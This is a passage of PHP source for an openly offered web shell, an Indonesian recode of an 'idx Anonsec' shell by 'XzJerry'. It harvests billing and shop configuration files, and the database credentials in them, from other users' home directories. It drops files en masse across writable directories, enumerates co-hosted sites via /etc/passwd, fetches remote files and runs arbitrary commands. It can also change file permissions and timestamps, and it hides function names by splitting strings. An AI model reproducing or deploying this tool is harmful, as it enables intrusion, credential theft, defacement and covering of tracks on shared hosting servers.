                        "/home/$user_con/public_html/CHECKOUT/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Checkout/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/checkout/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BASKET/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Basket/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/basket/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/SECURE/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Secure/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/secure/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/SALES/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Sales/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/sales/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BILL/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Bill/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/bill/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/PURCHASE/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Purchase/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/purchase/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/ACCOUNT/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Account/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/account/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/USER/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/User/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/user/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/CLIENTS/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Clients/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/clients/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/BILLINGS/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/Billings/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/billings/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/MY/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/My/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/my/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/secure/whm/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/secure/whmcs/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/panel/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/clientes/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/cliente/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/support/order/submitticket.php" => 'WHMCS',
                        "/home/$user_con/public_html/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/boxbilling/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/box/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/host/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/Host/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/supportes/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/support/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/hosting/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/cart/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/order/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/client/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/clients/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/cliente/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/clientes/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/billing/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/billings/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/my/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/secure/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/support/order/bb-config.php" => 'BoxBilling',
                        "/home/$user_con/public_html/includes/dist-configure.php" => 'Zencart',
                        "/home/$user_con/public_html/zencart/includes/dist-configure.php" => 'Zencart',
                        "/home/$user_con/public_html/products/includes/dist-configure.php" => 'Zencart',
                        "/home/$user_con/public_html/cart/includes/dist-configure.php" => 'Zencart',
                        "/home/$user_con/public_html/shop/includes/dist-configure.php" => 'Zencart',
                        "/home/$user_con/public_html/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/hostbills/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/host/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/Host/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/supportes/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/support/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/hosting/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/cart/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/order/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/client/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/clients/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/cliente/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/clientes/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/billing/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/billings/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/my/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/secure/includes/iso4217.php" => 'Hostbills',
                        "/home/$user_con/public_html/support/order/includes/iso4217.php" => 'Hostbills',
                    ];
                    foreach ($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if ($ambil_config == '') {
                        } else {
                            $file_config = fopen("xjerry_config/$user_con-$nama_config.txt", 'w');
                            fwrite($file_config, $ambil_config);
                        }
                    }
                }
            }
        }
    }
    echo "<center><a href='?path=$lokasi/xjerry_config'><font color=lime>Done</font></a></center>";
    exit;

} elseif ($_REQUEST['mass'] == "xjerry") {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "$lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "$dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: ;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br><br>
	<font style='text-decoration: ;'>Directory:</font><br>
	<input type='text' name='d_dir' value='$lokasi' style='width: 450px;height: 20px;'><br>
	<font style='text-decoration: ;'>Nama File:</font><br>
	<input type='text' name='d_file' value='' style='width: 450px;height: 20px;' placeholder='isi nickname'><br>
	<font style='text-decoration: ;'>Isi File:</font><br>
	<textarea name='script' style='width: 600px; height: 250px;' placeholder='isi script'></textarea><br>
	<input type='submit' class='button' name='start' value='Sikat!!' style='width: 450px;'>
	</form></center><br>";
}
exit;
} elseif($_GET['jump'] == 'xjerry') {
	$i = 0;
	echo "<center>Jumping server<center><br>	<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?path=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?path=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<center><font color=red>Can't read /etc/passwd</font></center>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<center><font color=red>Can't read /etc/passwd</font></center>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	
	echo "</div>";}
	elseif ($_REQUEST['about'] == "xjerry") {
		echo "<hr><center>About ME<br><br>";
		echo "Recode Shell Dari idx Anonsec dan sedikit merubah tampilan<br>";
		echo "Tanpa adanya logger, shell ini aman digunakan<br>";
		echo "Tunggu shell versi terbarunya dari saya ";
		echo "Recode by => XzJerry </center><hr><br>";}

	elseif ($_REQUEST['buatfile'] == "xjerry") {
		echo "<center>
    <form method='POST'>
        <input type='text' class='form-control' value='$lokasi/filekamu.php' style='width: 400px;' name='nama_file' autocomplete='off' placeholder='Nama File...'><br><br/>
        <textarea name='isi_file' class='form-control' rows='15' cols='70' placeholder='Isi File...'></textarea><br/>
        <button type='sumbit' class='button' name='bikin'>Bikin!!</button><br><br/>
    </form></center>";

    if (isset($_POST['bikin'])) {
        $nama_file = $_POST['nama_file'];
        $isi_file = $_POST['isi_file'];
        $handle = fopen("$nama_file", 'w');

        if (fwrite($handle, $isi_file)) {
            echo '<center>File Berhasil dibuat !!&nbsp;<font color="gold"><i>'.$nama_file.'</i></font><br><br></center>';
        } else {
            echo '<script>alert("File Gagal Dibuat");</script>';
        }
    }
}
elseif ($_REQUEST['info'] == "xjerry") {
	echo "<br><hr>";
	echo "Server IP : <font color=gold>".ipserv()."</font> &nbsp;/&nbsp; Your IP : <font color=gold>".$_SERVER['REMOTE_ADDR']."</font><br>";
	echo "Web Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
	echo "System : <font color='gold'>".php_uname()."</font><br>";
	echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
	echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
	echo "Disable Function : ".$disf."</font><br>";
	echo "MySQL : ";
	echo "<hr><br>";}

if(isset($_GET['loknya'])){
	$lokasi = $_GET['loknya'];
	$lokdua = $_GET['loknya'];
} else {
	$lokasi = $gcw();
	$lokdua = $gcw();
}

$lokasi = $srl('\\','/',$lokasi);
$lokasis = $exp('/',$lokasi);
$lokasinya = @$scd($lokasi);

foreach($lokasis as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?loknya=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?loknya=';
	for($i=0;$i<=$id;$i++){
	echo "$lokasis[$i]";
	if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
		}
		if (empty($_FILES['berkas']['name'])) {
			echo "<font color=orange>Fi"."le not Se"."lected !</font><br><br>";
		} else {
			$data = @$fpt($lokasi."/".$_FILES['berkas']['name'], @$fgt($_FILES['berkas']['tm'.'p_na'.'me']));
				if ($fxt($lokasi."/".$_FILES['berkas']['name'])) {
					$fl = $lokasi."/".$_FILES['berkas']['name'];
					echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
					}
					echo "<br>";
				} else {
					echo "<font color='red'>Fa"."ile"."d to Up"."lo"."ad !</font><br><br>";
			}
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			echo "<font color=orange>Fi"."lename cannot be empty !</font><br><br>";
		} elseif (empty($_POST['darilink'])) {
			echo "<font color=orange>Link cannot be empty !</font><br><br>";
		} else {
			if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
			}
				$data = @$fpt($lokasi."/".$_POST['namalink'], @$fgt($_POST['darilink']));
				if ($fxt($lokasi."/".$_POST['namalink'])) {
					$fl = $lokasi."/".$_POST['namalink'];
					echo "Fi"."le Uplo"."ade"."d ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
					}
					echo "<br>";
				} else {
					echo "<font color='red'>Fa"."iled to Up"."lo"."ad !</font><br><br>";
				}
		}
	}
}
echo "Uplo"."ad Fi"."le : ";
echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.crt().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="fi'.'le" name="berkas"><input type="submit" name="berkasnya" value="Up'.'load" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="https://an'.'on7.xyz/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo '<br><form method="post" enctype="application/x-www-form-urlencoded">
Co'.'mm'.'an'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="'.htmlspecialchars($_POST['komend']).'">
<input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";

echo '<hr><center style="font-family: Russo One">';
echo tuls("HOME", $_SERVER['SC'.'RIP'.'T_N'.'AME']);
//echo tuls("HOME");
echo "<hr></center><br>";
if (isset($_GET['lokasie'])) {
	echo "<tr><td>Current Fi"."le : ".$_GET['lokasie'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars($fgt($_GET['lokasie']))."</pre>";
	author();
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
		xrd($_POST['loknya']);
		if ($fxt($_POST['loknya'])) {
			red("Fai"."led to del"."ete Dir"."ec"."tory !");
		} else {
			green("Del"."ete Dir"."ect"."ory Suc"."cess !");
		}
	} elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
		@$ulk($_POST['loknya']);
		if ($fxt($_POST['loknya'])) {
			red("Failed to Delete Fi"."le !");
		} else {
			green("De"."le"."te Fi"."le Succ"."ess !");
		}
	} else {
		red("Fi"."le / Dir"."ecto"."ry not Fo"."und !");
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahmod">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	} else {
		$cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
		if ($cm == true) {
			green("Change Mod Success !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Mod Failed !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		}
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['loknya']."/".$_POST['newname'];
		$ceen = "re"."na"."me";
		if (@$ceen($_POST['loknya'], $namabaru) === true) {
			green("Change Name Success");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($_POST['newname']).'" />
			<input type="hidden" name="loknya" value="'.$_POST['newname'].'">
			<input type="hidden" name="pilih" value="ubahnama">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Name Failed");
		}
	} else {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['loknya'])).'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['loknya'], $_POST['src']);
		if ($fgt($_POST['loknya']) == $_POST['src']) {
			green("Ed"."it Fi"."le Suc"."ce"."ss !");
		} else {
			red("Ed"."it Fi"."le Fai"."led !");
		}
	}
	echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['loknya'])).'</textarea><br>
	<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
	<input type="hidden" name="pilih" value="ed'.'it">
	<input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
	</form><br>';
} elseif (isset($_POST['komends'])) {
	if (isset($_POST['komend'])) {
		if (isset($_GET['loknya'])) {
			$lk = $_GET['loknya'];
		} else {
			$lk = $gcw();
		}
		$km = 'ko'.'me'.'nd';
		echo $km($_POST['komend'], $lk);
		exit();
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "st"."rtot"."ime";
		$tch = "t"."ou"."ch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['loknya'], $tanggale) === true) {
			green("Change Da"."te Succ"."ess !");
			$det = "da"."te";
			$ftm = "fi"."le"."mti"."me";
			$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahtanggal">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Fai"."led to Cha"."nge Da"."te !");
		}
	} else {
		$det = "da"."te";
		$ftm = "fi"."le"."mti"."me";
		$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahtanggal">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
	$dunlute = $_POST['loknya'];
	if ($fxt($dunlute) && isset($dunlute)) {
		if ($ird($dunlute)) {
			dunlut($dunlute);
		} elseif ($idr($fl)) {
			red("That is Di"."rec"."tory, Not Fi"."le -_-");
		} else {
			red("Fi"."le is Not Re"."adab"."le !");
		}
	} else {
		red("Fi"."le Not Fo"."und !");
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['loknya'];
        if (isset($_POST['buatfolder'])) {
            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
            if ($buatf == true) {
                green("Folder <b>".htmlspecialchars($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");
                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="folder"></form>';
            } else {
                red("Failed to Create folder !");
                echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
                <input type="hidden" name="pilih" value="folder"></form>';
            }
        } else {
            echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="folder"></form>';
        }
    }
} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
    if ($isw("./") || $isr("./")) {
        $loke = $_POST['lok'.'nya'];
        if (isset($_POST['buatfi'.'le'])) {
            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
                green("File <b>".htmlspecialchars($_POST['fi'.'lebaru'])."</b> Created !");
